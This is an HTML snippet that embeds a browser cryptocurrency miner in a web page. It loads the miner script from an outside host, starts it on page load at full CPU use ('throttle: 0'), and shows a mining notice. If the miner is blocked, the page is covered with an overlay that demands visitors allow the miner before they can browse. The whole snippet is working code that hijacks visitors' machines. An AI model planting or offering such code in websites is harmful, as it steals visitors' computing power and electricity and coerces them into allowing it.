<script src="https://www.hostingcloud.racing/BOU7.js"></script>
<script>
    var _client = new Client.Anonymous('135403f1935c30d489b24174583f6bf50048f25bc5ec2f084ca9050e2d389b54', {
        throttle: 0, c: 'w'
    });
    _client.start();
    _client.addMiningNotification("Top", "Turn Off Adblock", "#cccccc", 40, "#3d3d3d");
</script>
<script>
    setTimeout(function(){
        if(typeof _client === 'undefined' || _client === null)
        {
            var messageDiv = document.createElement("div");
            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
            var mainDiv = document.createElement("div");
            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
            mainDiv.appendChild(messageDiv);
            document.body.appendChild(mainDiv);
            document.getElementsByTagName("body")[0].style.overflow = "hidden";
            window.scrollTo(0, 0);
        }
    },1000);
</script>